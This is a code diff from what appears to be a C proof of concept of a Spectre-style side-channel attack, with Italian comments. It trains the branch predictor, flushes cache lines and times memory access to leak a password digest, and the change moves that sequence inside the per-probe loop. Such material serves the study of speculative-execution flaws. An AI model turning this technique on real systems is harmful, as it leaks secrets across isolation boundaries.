@@ -103,27 +103,25 @@ int main(int argn, char *argv[]) {
 		// per ogni run
 		for (int j = 0; j < numberOfRuns; j++) {
 
-			//addestro il branch predictor
-			for (int i = 0; i < 3; i++) {
-				victim_function(1, passwordDigest[1]);
-			}
-
-			// flushing array2 e passwordDigest dalla cache
-			for (int i = 0; i < SIZE; i++) {
-				_mm_clflush(&array2[i]);
-				_mm_clflush(&passwordDigest[i]);
-			}
-
-			// aspetto che le operazioni in memoria vengano eseguite
-			_mm_lfence();
-
-			// richiamo la funzione vittima con l'ID da attaccare
-			// e la password sbagliata
-			victim_function(userUnderAttack, wrongPassword);
-
-			_mm_lfence();
-
 			for (int l = 1; l <= class; l++) {
+
+				//addestro il branch predictor
+				for (int i = 0; i < 3; i++) {
+					victim_function(1, passwordDigest[1]);
+				}
+
+				// flushing array2 e passwordDigest dalla cache
+				for (int i = 0; i < SIZE; i++) {
+					_mm_clflush(&array2[i]);
+					_mm_clflush(&passwordDigest[i]);
+				}
+
+				// aspetto che le operazioni in memoria vengano eseguite
+				_mm_lfence();
+
+				// richiamo la funzione vittima con l'ID da attaccare
+				// e la password sbagliata
+				victim_function(userUnderAttack, wrongPassword);
 
 				// calcolo il tempo di accesso alla posizione l
 				time1 = __rdtscp(&timeReg);
